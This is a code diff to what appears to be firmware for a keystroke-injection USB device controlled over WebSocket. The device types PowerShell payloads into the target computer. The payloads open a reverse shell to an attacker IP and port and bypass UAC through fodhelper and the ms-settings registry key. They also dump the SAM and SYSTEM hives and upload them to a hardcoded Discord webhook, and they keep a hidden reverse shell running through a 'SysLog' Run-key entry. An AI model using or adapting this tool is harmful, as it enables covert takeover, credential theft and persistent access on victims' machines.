@@ -509,10 +509,10 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(1000);
         Keyboard.print(
             String("powershell -w h -nop -ep bypass -c \"") +
-            "Set-Content -Path ($env:TEMP+'\\ar.ps1') -Value '$c=New-Object Net.Sockets.TCPClient(''" + currentAttackerIP + "''," + currentAttackerPort + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()';" +
+            "Set-Content -Path '%TEMP%\\ar.ps1' -Value '$c=New-Object Net.Sockets.TCPClient(''" + currentAttackerIP + "''," + currentAttackerPort + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()';" +
             "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;" +
             "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;" +
-            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value ('powershell -w h -nop -ep bypass -f '+$env:TEMP+'\\ar.ps1') -Force;" +
+            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'powershell -w h -nop -ep bypass -f %TEMP%\\ar.ps1' -Force;" +
             "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';" +
             "Start-Sleep -s 5;" +
             "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
@@ -625,15 +625,15 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(1000);
         Keyboard.print(
             "powershell -w h -nop -ep bypass -c \""
-            "Set-Content -Path ($env:TEMP+'\\s.ps1') -Value '"
-            "$t=$env:TEMP+''\\SAM_Backup.zip'';$w=$env:TEMP+''\\r'';mkdir $w -Force;"
+            "Set-Content -Path '%TEMP%\\s.ps1' -Value '"
+            "$t=''%TEMP%\\SAM_Backup.zip'';$w=''%TEMP%\\r'';mkdir $w -Force;"
             "reg save HKLM\\SAM $w''\\sam'' /y;reg save HKLM\\SYSTEM $w''\\system'' /y;"
             "if(Test-Path ($w+''\\sam'')){Compress-Archive -Path $w\\* -DestinationPath $t -Force;"
             "$h=Get-Item $t;Invoke-RestMethod -Uri ''https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3'' -Method Post -Form @{file=$h}}"
             "Remove-Item $w -Recurse -Force;Remove-Item $t -Force';"
             "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
             "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
-            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value ('powershell -w h -nop -ep bypass -f '+$env:TEMP+'\\s.ps1') -Force;"
+            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'powershell -w h -nop -ep bypass -f %TEMP%\\s.ps1' -Force;"
             "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';"
             "Start-Sleep -s 5;"
             "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
@@ -688,9 +688,8 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(1000);
         Keyboard.print(
             String("powershell -w h -nop -ep bypass -c \"") +
-            "Set-Content -Path ($env:APPDATA+'\\s.ps1') -Value 'while($true){try{$c=New-Object Net.Sockets.TCPClient(''" + currentAttackerIP + "''," + currentAttackerPort + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()}catch{Start-Sleep -Seconds 5}}';" +
-            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run " +
-            "/v SysLog /t REG_SZ /d \\\"powershell -w h -nop -ep bypass -f $env:APPDATA\\s.ps1\\\" /f\" " +
+            "Set-Content -Path '%APPDATA%\\s.ps1' -Value 'while($true){try{$c=New-Object Net.Sockets.TCPClient(''" + currentAttackerIP + "''," + currentAttackerPort + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sr=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sr,0,$sr.Length);$s.Flush()};$c.Close()}catch{Start-Sleep -Seconds 5}}';" +
+            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SysLog /t REG_SZ /d \\\"powershell -w h -nop -ep bypass -f %APPDATA%\\s.ps1\\\" /f\" " +
             "& exit");
         delay(300);
         Keyboard.press(KEY_RETURN);
